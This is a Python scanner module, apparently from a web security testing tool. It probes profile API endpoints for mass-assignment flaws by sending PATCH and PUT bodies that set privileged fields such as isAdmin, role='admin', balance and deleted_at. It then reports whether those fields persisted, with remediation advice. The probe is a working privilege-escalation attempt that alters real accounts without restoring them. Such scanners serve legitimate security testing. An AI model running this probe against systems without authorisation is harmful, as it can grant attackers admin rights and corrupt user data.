"""mass_assignment_patch — mass-assignment via PATCH/PUT with privileged fields.

Existing mass_assignment scans POST. This one probes PATCH/PUT requests
on profile-style endpoints with privileged fields (isAdmin, role, balance,
emailVerified, deleted_at) and checks if the server accepts the mutation.
Requires auth_bearer (normal user token).
"""
import json
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._vl_core.turbo import vl_turbo

router = APIRouter()
PROFILE_PATHS = ["/api/users/me", "/api/me", "/api/profile",
                  "/api/v1/me", "/api/account"]
PRIV_FIELDS = ["isAdmin", "is_admin", "role", "balance",
                "emailVerified", "email_verified", "verified",
                "credit", "premium", "tier", "deleted_at"]


@router.post("/api/webapp/scan/mass_assignment_patch")
@vl_turbo()
def scan_mass_assignment_patch(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    token = (req.auth_bearer or "").strip()
    if not token:
        return standard_response(
            tool="mass_assignment_patch", target=req.target, findings=[],
            tests_performed=0, vulnerable=False,
            skipped_reason="No JWT — pass non-admin token via auth_bearer")
    hdrs = {"Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": "VulnusLab/1.0"}

    bugs = []
    tested = 0
    for path in PROFILE_PATHS:
        url = base + path
        # First confirm endpoint exists for this user
        r0 = safe_request("GET", url, headers=hdrs, req=req, timeout=6,
                            allow_redirects=False)
        if r0 is None or r0.status_code != 200: continue
        tested += 1

        # Send PATCH with privileged fields
        body = {f: True for f in PRIV_FIELDS}
        body["role"] = "admin"
        body["balance"] = 999999
        body["tier"] = "platinum"

        for method in ("PATCH", "PUT"):
            r = safe_request(method, url, headers=hdrs,
                data=json.dumps(body), req=req, timeout=8, allow_redirects=False)
            if r is None: continue
            if r.status_code not in (200, 204): continue
            # Now re-fetch /me and check if any privileged field stuck
            r_check = safe_request("GET", url, headers=hdrs, req=req,
                timeout=6, allow_redirects=False)
            if r_check is None: continue
            try:
                cur = r_check.json()
            except Exception: continue
            stuck = []
            for f in PRIV_FIELDS:
                if f in cur and cur[f] in (True, "admin", "platinum", 999999):
                    stuck.append(f)
            if stuck:
                bugs.append({"path": path, "method": method, "stuck_fields": stuck})
                break

    findings = []
    if bugs:
        findings.append(wrap_finding(
            f"MASS ASSIGNMENT via PATCH at {len(bugs)} endpoint(s)",
            "CRITICAL", cvss="9.0", cwe="CWE-915", owasp="A04:2021",
            remediation="Whitelist allowed fields in PATCH/PUT handlers (Rails: "
                        "strong_params; Django: ModelForm.Meta.fields; Mongoose: "
                        "schema.set('strict', 'throw')). Without whitelist, "
                        "attacker promotes themselves to admin via /api/me PATCH "
                        "with isAdmin=true.",
            evidence_marker=" | ".join(
                f"{b['path']} {b['method']}: stuck = {b['stuck_fields']}" for b in bugs[:3]
            )))
    else:
        findings.append(wrap_finding(
            f"Mass assignment rejected ({tested} profile endpoints tested)",
            "POSITIVE", cwe="CWE-915", remediation="Maintain field whitelisting.",
            evidence_marker=f"{tested} endpoints × PATCH+PUT clean"))
    return standard_response(
        tool="mass_assignment_patch", target=req.target, findings=findings,
        tests_performed=tested * 2, vulnerable=bool(bugs),
        tests_summary=f"{tested} endpoints, {len(bugs)} exploitable",
        raw_data={"bugs": bugs})


def register(app):
    app.include_router(router)
